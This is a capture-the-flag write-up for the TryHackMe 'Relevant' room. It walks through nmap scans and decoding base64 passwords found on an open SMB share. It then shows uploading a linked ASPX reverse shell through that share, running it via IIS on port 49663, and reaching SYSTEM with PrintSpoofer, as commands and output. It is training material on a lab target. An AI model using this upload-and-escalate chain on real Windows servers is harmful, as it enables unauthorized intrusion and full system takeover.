---
title: THM{Relevant}
author: Anugrah SR
date: 2020-11-18 01:30:00 +0800
categories: [Boot2root,Tryhackme]
tags: [ tryhackme, nmap, aspx, smb, windows, smbclient, printspoofer ]
math: true
#image: "https://i.imgur.com/H98yNCQ.png"
---
# Relevant
## About The Room
*Penetration Testing Challenge*<br>
* Url: https://tryhackme.com/room/relevant
* Creator: [TheMayor](https://tryhackme.com/p/TheMayor)
* Difficulty: Medium

## Reconnaissance
### Nmap scan
```bash
nmap -sV -sC -T4 10.10.172.142 -oN nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-17 12:48 EST
Nmap scan report for 10.10.172.142
Host is up (0.17s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2020-11-17T17:48:55+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2020-07-24T23:16:08
|_Not valid after:  2021-01-23T23:16:08
|_ssl-date: 2020-11-17T17:49:35+00:00; +1s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m40s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-11-17T09:48:57-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-11-17T17:48:56
|_  start_date: 2020-11-17T17:43:36

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.59 seconds
```
### SMB
#### Smbclient
```bash
smbclient //10.10.172.142/nt4wrksv    
Enter WORKGROUP\cyph3r's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
```
What's in `passwords.txt`
```bash
┌──(cyph3r㉿cypher-PC)-[~/thm/Relevant]
└─$ cat passwords.txt    
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                                                                   
┌──(cyph3r㉿cypher-PC)-[~/thm/Relevant]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw=="|base64 -d        
Bob - !P@$$W0rD!123                                                                                                                   
┌──(cyph3r㉿cypher-PC)-[~/thm/Relevant]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk"|base64 -d
Bill - Juw4nnaM4n420696969!$$$                                  
```
I didn't know what to do! I got a tip to scan every port, i used `rustscan` to find the ports abd did `nmap` on that ports
```bash
nmap -sV -sC -p 80,135,139,445,3389,49663,49666,49668 10.10.162.228

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-17 14:27 EST
Nmap scan report for relevant.thm (10.10.162.228)
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2020-11-17T19:28:02+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2020-07-24T23:16:08
|_Not valid after:  2021-01-23T23:16:08
|_ssl-date: 2020-11-17T19:28:42+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m01s, deviation: 3h34m42s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-11-17T11:28:05-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-11-17T19:28:01
|_  start_date: 2020-11-17T19:12:41

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.24 seconds
```
Looks like port 49663 have somthing for us!
![](https://imgur.com/7AHZzSDl.png)
## Gaining Shell
Found Reverse aspx [shell](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx) and uploaded to smb

```bash
smbclient //relevant.thm/nt4wrksv -u bob -p                                       
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (26.5 kb/s) (average 26.5 kb/s)
smb: \>
```
Visit `http://relevant.thm:49663/nt4wrksv/shell.aspx`
![](https://imgur.com/Mfcsnbol.png)
### Privilege escalation
```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
[PrintSpoofer - Github](https://github.com/dievus/printspoofer)
```bash
smbclient //relevant.thm/nt4wrksv -u bob -p       
Try "help" to get a list of possible commands.

smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (41.5 kb/s) (average 34.3 kb/s)
```
```bash
cd C:\inetpub\wwwroot\nt4wrksv
PrintSpoofer.exe -i -c cmd
```
```bash
C:\Windows\system32>whoami
whoami
nt authority\system
```
#### User flag
```bash
C:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4xxxxxxxxxxxxx89ktf45}
```
#### Root flag
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5xxxxxxxxxxxxxxx345pv}
```
